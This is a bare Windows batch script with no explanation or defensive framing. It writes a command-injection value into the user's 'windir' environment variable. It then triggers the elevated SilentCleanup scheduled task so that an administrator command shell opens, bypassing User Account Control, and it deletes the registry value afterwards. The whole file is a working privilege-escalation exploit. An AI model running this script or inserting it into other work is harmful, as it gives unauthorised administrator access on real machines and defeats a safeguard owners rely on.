@echo off
reg add HKCU\Environment /v windir /d "cmd /K reg delete HKCU\Environment /v windir /f && REM " /f
reg add HKCU\Environment /v windir /d "cmd && REM" /f
schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
reg delete HKCU\Environment /v windir /f